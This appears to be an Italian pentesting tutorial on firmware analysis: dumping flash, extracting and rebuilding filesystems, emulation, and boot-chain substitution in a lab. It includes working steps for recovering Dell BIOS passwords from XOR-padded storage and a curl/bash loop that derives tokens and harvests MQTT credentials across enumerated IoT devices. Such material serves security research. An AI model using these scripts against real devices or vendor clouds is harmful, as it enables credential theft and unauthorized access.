# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

Per acquisire firmware tramite interfacce hardware esposte, consulta [dumping del firmware assistito dalla console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) e [dumping della flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Per acquisire ripetutamente i dati UART all'avvio, prima di poter accedere alla console, consulta [alimentazione controllata tramite SCPI e acquisizione con oscilloscopio](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato in una memoria permanente, così che il dispositivo possa accedere alle istruzioni essenziali fin dal momento dell'accensione e avviare il sistema operativo. Esaminare ed eventualmente modificare il firmware è un passaggio fondamentale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo consiste nel raccogliere dati su:

- L'architettura della CPU e il sistema operativo utilizzato
- I dettagli del bootloader
- La disposizione dell'hardware e le schede tecniche
- Le metriche della codebase e le posizioni del codice sorgente
- Le librerie esterne e i tipi di licenza
- La cronologia degli aggiornamenti e le certificazioni normative
- I diagrammi dell'architettura e dei flussi
- Le valutazioni di sicurezza e le vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di eventuali componenti software open source disponibili tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [LGTM di Semmle](https://lgtm.com/#explore) offrono analisi statica gratuita, utile per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in diversi modi, ciascuno con un diverso livello di complessità:

- Direttamente dalla fonte (sviluppatori, produttori)
- Compilandolo seguendo le istruzioni fornite
- Scaricandolo dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati online
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- Estraendolo dal dispositivo tramite connessioni come **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) o **PICit**
- Intercettando le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuando e utilizzando endpoint di aggiornamento **hardcoded**
- Eseguendo il **dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, come ultima risorsa, utilizzando gli strumenti hardware appropriati

### Log disponibili solo tramite UART: forzare una root shell tramite l'ambiente U-Boot nella flash

Se RX UART viene ignorato (solo log), è comunque possibile forzare una shell init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Esegui il dump della flash SPI con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Riprogramma solo la partizione env e riavvia; dovrebbe apparire una shell su UART.

È utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso a una memoria Flash esterna.

### Divulgazione di codice protetto tramite un task di copia del Firewall

Alcuni MCU consentono al codice dell'applicazione non protetto di chiamare un gateway della regione protetta, anziché leggere direttamente la Flash protetta. Dopo aver ottenuto l'esecuzione di codice nell'applicazione, esamina ogni task del gateway come una primitiva di trasferimento della memoria distinta. Nel caso di Cypherock X1, il call gate del Firewall STM32L4 accettava un task, un puntatore esterno `data`, una lunghezza e un `address` protetto. Un task di scrittura non verificava che il puntatore sorgente `data` non puntasse all'interno del Firewall Code. Il chiamante non poteva leggere direttamente quel codice, ma il gateway stesso poteva copiarlo nella memoria non volatile protetta, da cui un task di lettura autorizzato lo rendeva accessibile.<sup>[[15]](#references)</sup>

Per riprodurre questo tipo di divulgazione, individua una pagina di memoria protetta scrivibile con un task di lettura corrispondente, imposta la sorgente di scrittura su indirizzi successivi del codice protetto e leggi i byte temporaneamente memorizzati. Prima di ripetere le scritture, verifica il supporto di memorizzazione: in questo caso era Flash, quindi era necessario cancellare una pagina prima di riutilizzarla. I ricercatori hanno usato una routine che cancellava e ripristinava i contenuti validi di Secure Data Storage, quindi memorizzava temporaneamente il codice nello spazio libero rimanente, senza sovrascrivere i dati del wallet. È necessario poter eseguire codice sull'MCU e raggiungere un call gate; non si tratta di un bypass diretto della lettura da un host non autenticato.<sup>[[15]](#references)</sup>

Il codice recuperato può rivelare [lacune nella fiducia degli aggiornamenti del firmware e dell'integrità del boot](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne informazioni per capire come trattarlo. Ecco alcuni strumenti che puoi usare:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`: se è bassa, probabilmente non è cifrata. Se è alta, probabilmente è cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre i **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Asset grafici grezzi nella flash esterna

Un dump SPI esterno non è necessariamente il firmware eseguibile dell'MCU. Per un target Cortex-M, confronta l'inizio di ogni possibile regione di codice con la mappa di memoria del dispositivo: una normale tabella dei vettori inizia con un puntatore allo stack SRAM plausibile e un indirizzo del gestore di reset nella memoria eseguibile. L'assenza di una tabella dei vettori all'offset zero non dimostra, da sola, che l'intero chip sia privo di codice; ispeziona altri offset e la configurazione di boot. Se `binwalk` non trova alcun container, ispeziona i byte grezzi e metti in relazione gli indirizzi di lettura della flash ottenuti da una [cattura SPI decodificata](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) con le azioni che caricano nuove schermate.<sup>[[14]](#references)</sup>

Per una regione contenente asset grafici, prova diversi formati pixel e dimensioni invece di presumere che sia PNG/JPEG. Il dispositivo citato usava fotogrammi **80×160 RGB565 little-endian**: con due byte per pixel, un fotogramma è di **25.600 byte** (25 KiB), non 24 kilobit. Un indirizzo di lettura della flash decodificato ha permesso di identificare l'offset dell'asset della schermata; il ricercatore ha convertito un'immagine preparata con `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, ha sostituito l'asset, di dimensioni identiche, nel dump originale, l'ha scritto con `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` e ha verificato la nuova immagine sul display. Questo dimostra che è possibile scrivere gli *asset grafici esterni del display*, non estrarre o riscrivere il firmware interno dell'MCU. Conserva il dump originale e verifica dimensioni, ordine dei byte, offset e lunghezza della sostituzione prima di effettuare qualsiasi scrittura.<sup>[[14]](#references)</sup>

### Analisi differenziale della flash e archivi di segreti XOR recuperabili

Quando un'impostazione del firmware non ha un formato di archiviazione documentato, acquisisci prima diverse letture corrispondenti della flash, modifica **esattamente una** impostazione, esegui nuovamente il dump dell'intero chip e confronta gli offset. Ripetendo l'esperimento con valori controllati, puoi distinguere l'impostazione dai contatori e dai metadati di scrittura; modifiche a nuovi offset, invece che in-place, indicano un archivio append-only o log-structured. Conserva le voci eliminate o contrassegnate come eliminate, poiché i relativi byte del payload potrebbero essere ancora recuperabili.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Dopo aver individuato la regione, estrai i moduli del firmware con strumenti come `binwalk` e fai reverse engineering del writer/validator in Ghidra. Verifica nel codice i limiti dei campi, il padding, l’indicizzazione delle chiavi e la derivazione della chiave, invece di dedurre lo schema solo dai pattern del ciphertext.<sup>[[12]](#references)</sup>

#### Recuperare le chiavi dal padding zero cifrato

Come descritto in [crittografia basata su XOR](../../crypto/symmetric/#xor-based-encryption), il known plaintext rivela i byte del keystream agli stessi offset. Un campo di dimensione fissa è particolarmente esposto quando il suo padding zero copre ogni indice di una chiave XOR ripetuta: il padding cifrato rivela direttamente quei byte della chiave, perché `0x00 XOR key_byte = key_byte`. Se sono coperti tutti gli indici della chiave, ricostruisci la chiave dalla coda del ciphertext e decifra i byte valorizzati.<sup>[[12]](#references)</sup>

Il formato vulnerabile della password BIOS DVAR di Dell è un esempio concreto: il byte `0` di un campo di 32 byte è in chiaro, mentre i byte `1..31` usano una chiave ripetuta di 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Per una password di lunghezza `L`, le posizioni da `L` a `31` erano a zero prima dell’XOR. Quando `L <= 12`, queste posizioni coprono tutti gli indici della chiave, quindi è possibile recuperare la chiave completa e la password senza brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Recuperare chiavi dai record storici

Non analizzare ogni record separatamente. La chiave DVAR deriva approssimativamente da `modified_md5(device_seed || variable_GUID || password[0])`: il device seed e il GUID sono fissi, e l’unico input dipendente dalla password è il primo byte in chiaro. Questo produce al massimo 256 chiavi per dispositivo, quindi i record che iniziano con lo stesso byte condividono una chiave. Raggruppa i record attivi ed eliminati in base a quel byte; un breve record storico può fare leak della chiave completa tramite il padding e decifrare un record corrente più lungo, il cui padding da solo non è sufficiente. La rotazione della password può quindi aumentare l’esposizione quando il vecchio ciphertext viene contrassegnato come eliminato anziché cancellato.<sup>[[12]](#references)</sup>

Lo strumento [`dellpwn`](https://github.com/R3n5k1/dellpwn) individua DVAR, convalida i record candidati, recupera le password e può mostrare i byte grezzi memorizzati/della chiave. Compilalo da un checkout ed esegui la scansione di un’immagine flash verificata come segue:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Per i parser personalizzati, rifiutate i falsi positivi verificando la struttura dei record, i vincoli sui caratteri stampabili, il padding a zero, l’entropia della chiave e la coerenza quando la chiave ricomincia. Se dump ripetuti mostrano pochi bit modificati per scrittura, elencate le maschere osservate e classificate le correzioni in base a questi vincoli, ma segnalate i caratteri ambigui invece di presentare un risultato euristico come un recupero esatto.<sup>[[12]](#references)</sup>

I verificatori di password dovrebbero memorizzare un hash unidirezionale iterato e con salt, invece di testo cifrato reversibile; inoltre, gli archivi con struttura a log dovrebbero rimuovere in modo sicuro il materiale segreto sostituito.<sup>[[12]](#references)</sup>

### Ottenere il filesystem

Con gli strumenti commentati in precedenza, come `binwalk -ev <bin>`, avreste dovuto riuscire a **estrarre il filesystem**.\
Binwalk di solito lo estrae in una **cartella che prende il nome dal tipo di filesystem**, che in genere è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non include il magic byte del filesystem tra le sue firme**. In questi casi, usate binwalk per **trovare l’offset del filesystem e ritagliare il filesystem compresso** dal binario, quindi **estraete manualmente** il filesystem in base al suo tipo, seguendo i passaggi riportati di seguito.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente **comando dd** per effettuare il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

Al termine, i file si troveranno nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ricostruire filesystem root embedded suddivisi

Se un dump raw di eMMC/SSD contiene un header di filesystem valido, ma gli offset dei metadati si estendono oltre i limiti nominali della partizione, non classificarlo subito come corrotto. Il codice di avvio embedded può assemblare il dispositivo root effettivo da più intervalli fisici tramite Device Mapper, quindi il carving di una singola partizione GPT produce solo il primo segmento.<sup>[[9]](#references)</sup>

#### Analizzare l'intera immagine del supporto

Per prima cosa, verifica che l'acquisizione sia terminata, che le dimensioni siano stabili e che nessun processo di scrittura stia ancora utilizzando l'immagine. Se il nome del file codifica un indirizzo iniziale/finale, confronta tale intervallo con il numero effettivo di byte. Recupera la GPT in modalità di sola lettura e collega solo l'intervallo necessario; **non** eseguire `vgchange -ay` su un volume fisico non attendibile nella workstation, perché sono possibili collisioni tra gruppi di volumi e scritture involontarie.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferisci una VM usa e getta quando la logica di init originale o uno stack LVM deve poter accedere all'intera immagine. I log di avvio storici di una partizione di avvio standard sono particolarmente utili: il bootloader potrebbe aver registrato gli offset dei container proprietari, le lunghezze dei componenti, la selezione dello slot, le regole di allineamento e la verifica delle firme. Usa questi valori per estrarre una command line, un kernel o un initramfs incorporati, quindi convalida ciascun output separatamente con `file`, i byte magici e `binwalk`; leggere fino alla fine del container può aggiungere accidentalmente al kernel un initrd, un oggetto ACPI o una firma.<sup>[[9]](#references)</sup>

#### Recuperare la mappa dei blocchi usata all'avvio

Estrai l'initramfs del kernel e fai reverse engineering di `/init` e di eventuali librerie di storage. In [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), cerca i riferimenti alle stringhe `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` e ai percorsi delle partizioni; poi segui il codice che seleziona lo slot A/B attivo e crea la tabella. Alcuni punti di partenza utili per radare2 sono `r2 -A init`, `afl`, `pdf @ main` e `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Il target lineare mappa intervalli consecutivi di un dispositivo virtuale su intervalli di uno o più dispositivi sottostanti. Una tabella recuperata con due segmenti ha comunemente questa forma (tutte le posizioni e le lunghezze sono espresse in settori da 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Riproduci esattamente l'aritmetica del codice macchina, inclusi la larghezza degli interi, gli shift e le conversioni delle unità. Per esempio, l'espressione seguente arrotonda per difetto una dimensione in byte al limite di 4 KiB e solo dopo la converte in settori da 512 byte; sostituirla con `p4_bytes // 512` sposta la porzione finale selezionata di `p4_bytes % 4096` ogni volta che la partizione non è allineata a una pagina.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ricostruisci un’immagine di analisi piatta copiando gli intervalli nell’ordine della tabella, usando chunk di dimensioni limitate invece di caricare l’intero dump multimediale in memoria. In questo modo eviti anche di creare dispositivi mapper lato host. Mantieni gli offset derivati da GPT, i conteggi dei settori invertiti e la lunghezza risultante dell’output come asserzioni separate.<sup>[[9]](#references)</sup>

#### Distingui la corruzione da un errore costante di ricostruzione

Per SquashFS, controlla il magic `hsqs` e decodifica il campo little-endian a 64 bit `bytes_used` all’offset 40 del superblock prima di eseguire `unsquashfs`. Se l’estrazione fallisce in diverse strutture non correlate, cerca in un’ampia finestra attorno alle posizioni previste e richiedi candidati strutturali solidi: un blocco di metadati decomprimibile, diverse voci di directory valide consecutive, campi inode plausibili, un inode root coerente con il numero di inode oppure una struttura di metadati di integrità valida. Una singola corrispondenza del magic non è sufficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Quando lo stesso delta firmato rende valide strutture indipendenti, ad esempio i metadati di una directory e un record verity, la causa più probabile è un errore sistematico nell'inizio del segmento, non byte mancanti. Torna ai calcoli invertiti e cerca resti scartati, problemi di signedness, overflow o arrotondamenti a settori/pagine prima di tentare il recupero di file orfani o di modificare i metadati del filesystem.<sup>[[9]](#references)</sup>

Infine, mantieni separati i confini di protezione: i volumi LUKS con chiavi sigillate nel TPM proteggono la riservatezza dei dati, mentre una mappatura dm-verity firmata protegge l'integrità del root filesystem. Un TPM software non recupera una chiave sigillata nel TPM fisico originale, e avviare un SquashFS modificato tramite un init destinato solo alla ricerca, che omette la verifica verity, non ne falsifica la firma né viola dm-verity.<sup>[[9]](#references)</sup>

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale esaminarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Per ulteriori strumenti e letture sull'analisi del firmware, consulta la [sezione firmware di Strumenti e risorse di terze parti](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Di seguito è fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli delle partizioni e dei filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della crittografia dell’immagine, si controlla l’**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l’assenza di crittografia, mentre un’alta entropia indica una possibile crittografia o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l’ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza di magic bytes, è necessario procedere con l’estrazione manuale. Questa consiste nell’usare `binwalk` per individuare l’offset del filesystem, quindi il comando `dd` per estrarre il filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es., squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di vulnerabilità. Si presta attenzione ai demoni di rete non sicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità dei server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

Tra le **posizioni** e gli **elementi chiave** da esaminare ci sono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da analizzare ulteriormente
- Server web e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ed [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati presenti nel filesystem devono essere esaminati attentamente alla ricerca di vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per quelli Windows aiutano a individuare binari privi di protezioni che potrebbero essere sfruttati.

## Recupero della configurazione cloud e delle credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica del dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware potresti scoprire che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design consente a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, che spesso rivela credenziali MQTT in testo semplice e prefissi dei topic.

Procedura pratica:

1) Estrai il deviceId dai log di avvio UART

- Collega un adattatore UART a 3,3 V (TX/RX/GND) e acquisisci i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano lo schema dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperare STATIC_KEY e l’algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l’uso di MD5.
- Confermare l’algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e convertire il digest in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Raccogliere la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Sfrutta MQTT in chiaro e ACL deboli per i topic (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- È possibile iterare sugli ID candidati, ricavare token e recuperare configurazioni in modo programmatico:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un’autorizzazione esplicita prima di tentare un’enumerazione massiva.
- Quando possibile, preferisci l’emulazione o l’analisi statica per recuperare i segreti senza modificare l’hardware target.

Il processo di emulazione del firmware consente l’**analisi dinamica** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può presentare difficoltà legate alle dipendenze dall’hardware o dall’architettura, ma trasferire il filesystem root o specifici binari su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può facilitare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l’endianness e l’architettura della CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario con architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian), si usa `qemu-mips`; per i binari little-endian, si può usare `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM, il processo è simile: per l'emulazione si utilizza l'emulatore `qemu-arm`.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri consentono l'emulazione completa del firmware, automatizzando il processo e supportando l'analisi dinamica.

### Ricostruzione dei filesystem root suddivisi e verificati per l'emulazione

Se un superblocco SquashFS è leggibile, ma gli offset di inode, directory o tabella dei frammenti sono impossibili, non applicare subito patch a `unsquashfs`. Effettua il reverse engineering del binario di avvio iniziale e riproduci il grafo dei dispositivi a blocchi che crea: i sistemi embedded possono esporre una partizione root nominale, ma costruire il filesystem effettivo con una mappatura `dm-linear` che aggiunge settori presi in prestito da un'altra partizione. I controlli del solo superblocco possono avere esito positivo anche quando tutti i blocchi di metadati successivi sono spostati.<sup>[[11]](#references)</sup>

Mantieni esattamente l'aritmetica del firmware. In particolare, identifica se le lunghezze sono espresse in byte, settori da 512 byte o pagine da 4 KiB; riproduci gli shift e le troncature nell'ordine originale; e considera le regioni finali dipendenti dal banco nei layout A/B. Ad esempio, `(partition_bytes >> 12) << 3` prima tronca a un limite di 4 KiB e solo dopo esprime il risultato in settori da 512 byte; sostituirlo con `partition_bytes // 512` può spostare l'estensione aggiunta di alcuni kilobyte e corrompere tutte le tabelle SquashFS successive.<sup>[[11]](#references)</sup>

Un flusso di convalida utile è:<sup>[[11]](#references)</sup>

1. Ricava dal binario del verifier/init il dispositivo sorgente, il settore iniziale e la lunghezza di ogni segmento `dm-linear`.
2. Concatena o mappa le estensioni senza modificarne le modalità di allineamento.
3. Se l'estrazione continua a non riuscire, cerca solo in una piccola finestra attorno al confine previsto e richiedi diverse strutture di metadati valide consecutive, invece di accettare unicamente un superblocco plausibile.
4. Esegui `unsquashfs` senza modifiche sull'immagine ricostruita; la corretta esplorazione di tutte le directory e dei frammenti è una prova più solida di `unsquashfs -stat`.

#### Sostituzione di dm-verity controllata dall'analista

Quando l'analista controlla il kernel QEMU, l'initramfs e i dischi virtuali, è possibile avviare una root modificata sostituendo il PID 1 di verifica del vendor con un piccolo init collegato staticamente. Si tratta di una **lab boot-chain substitution**, non di una violazione di dm-verity, della sua firma RSA, di Secure Boot o di una chiave sigillata tramite TPM.<sup>[[11]](#references)</sup>

L'init sostitutivo dovrebbe riprodurre le parti operative del percorso di avvio originale: montare `devtmpfs`, chiamare `setsid()`, collegare `/dev/console` ai file descriptor 0–2, montare `/proc` e `/sys`, attendere il dispositivo a blocchi fornito, montare la root modificata in sola lettura, scollegare i pseudo-filesystem della vecchia root, spostare il nuovo mount su `/`, eseguire `chroot` e `execve()` dell'`/sbin/init` originale del firmware. Scollegare `/dev`, `/proc` e `/sys` **prima** di `MS_MOVE` evita di scollegare accidentalmente i punti di mount appartenenti alla nuova root.<sup>[[11]](#references)</sup>

Mantieni lo stato modificabile del dispositivo separato dalla root immutabile modificata. Un overlay qcow2 può conservare lo stato LVM del disco originale, mentre un secondo disco virtio in sola lettura fornisce lo SquashFS modificato:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debug dello stato dell’immagine offline

Ispeziona lo stato persistente al di fuori del guest quando avvii lenti, script di avvio distruttivi o log della console inaffidabili rendono difficile individuare il problema. Non collegare mai un overlay usato da una VM in esecuzione; esponilo con `qemu-nbd`, limita il rilevamento LVM alla partizione NBD prevista e disattiva il volume group prima di disconnetterlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
